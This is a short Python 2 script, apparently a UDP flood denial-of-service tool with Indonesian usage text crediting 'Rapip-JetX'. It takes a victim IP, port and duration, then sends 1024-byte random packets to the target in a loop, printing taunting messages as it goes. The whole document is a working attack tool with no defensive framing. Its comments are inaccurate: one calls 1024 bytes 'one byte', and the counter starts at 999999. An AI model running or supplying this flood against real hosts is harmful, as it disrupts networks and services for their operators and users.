import time
import socket
import random
import sys

def usage():
    print "Command: " + sys.argv[0] + " <ip> <port> <9999999>"
    print "Sebelum Di Pake, Gantengin Muka dulu Ngentod "
    print "Credit : Rapip-JetX "
    print "Tools By Rapip And My Brother JetX"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 999999

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Paket From %s Rapip & JetX %s Yahaha Down %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
#//999999